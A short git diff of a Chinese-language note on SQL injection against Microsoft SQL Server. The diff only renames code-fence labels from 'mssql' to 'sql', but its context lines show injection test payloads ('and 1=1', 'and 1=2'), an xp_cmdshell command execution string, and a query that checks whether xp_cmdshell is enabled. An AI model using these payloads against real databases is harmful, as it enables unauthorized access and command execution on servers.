@@ -35,7 +35,7 @@
 
 判断是否有注入
 
-```mssql
+```sql
 1. 判断是否有注入  (会有变化)
 and 1=1
 and 1=2
@@ -132,7 +132,7 @@ exec master.dbo.xp_cmdshell username;--
 
 - 利用mssql扩展存储注入攻击
 
-  ``` mssql
+  ``` sql
   1. 检测与恢复扩展存储
   /*判断xp_cmdhshell扩展存储是否存在*/
   and 1=(select name from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell')
